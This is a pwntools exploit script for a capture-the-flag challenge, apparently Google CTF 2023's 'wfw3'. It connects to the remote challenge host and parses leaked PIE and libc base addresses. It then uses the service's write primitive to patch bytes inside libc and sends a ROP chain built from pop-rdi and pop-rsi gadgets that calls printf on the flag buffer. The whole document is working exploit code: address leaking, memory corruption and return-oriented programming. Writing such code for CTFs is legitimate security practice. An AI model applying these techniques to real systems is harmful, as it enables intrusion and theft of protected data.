from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./main',env={"LD_PRELOAD":"./libc.so.6"})
# gdb.attach(p)
# p.interactive()
# exit(1)
sh='''
b *0x555555555478
b *0x555555555491
b exit
'''
# p = process("./chal")
# p = gdb.debug("./chal",sh,env={"LD_PRELOAD":"./libc.so.6"})
p = remote("wfw3.2023.ctfcompetition.com",1337)
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
def ch(addr,l):
    target = addr
    pay = hex(target).encode()+b" "+str(l).encode()
    p.send(pay.ljust(0x40,b'\0'))
def end(l):
    p.send(flat(l).ljust(0x40,b'\xff'))
    p.read()
def nop(addr,l):
    if l%2!=0:
        l=l-1
        ch(addr+l-1,1)
    for x in range(0,l,2):
        ch(addr+x,2)

ru(b" expire\n")
PIE = int(p.readuntil(b"-")[:-1],0x10)
info(hex(PIE))
for x in range(7):
    ru(b"\n")
base = int(p.readuntil(b"-")[:-1],0x10)
info(hex(base))
ru(b"\n\n")
ch(0x455f0+0x1b+base,1)
ch(0x455f0+0x17+base,1)
ch(0x455f0+0x2b-3+base,1)
ch(0x455f0+0x2b-2+base,2)
ch(0x455f0+0x1f+base,1)
ch(0x455f0+0x4+base,1)
ch(0x455f0+0x26+base,1)
rdi = 0x000000000002a3e5+base
bprintf = 0x555555555090-0x555555554000+PIE
flag = 0x5555555590A0-0x555555554000+PIE
rsi = 0x000000000002be51+base
end([rdi,1337,rsi,flag,bprintf,])
p.interactive()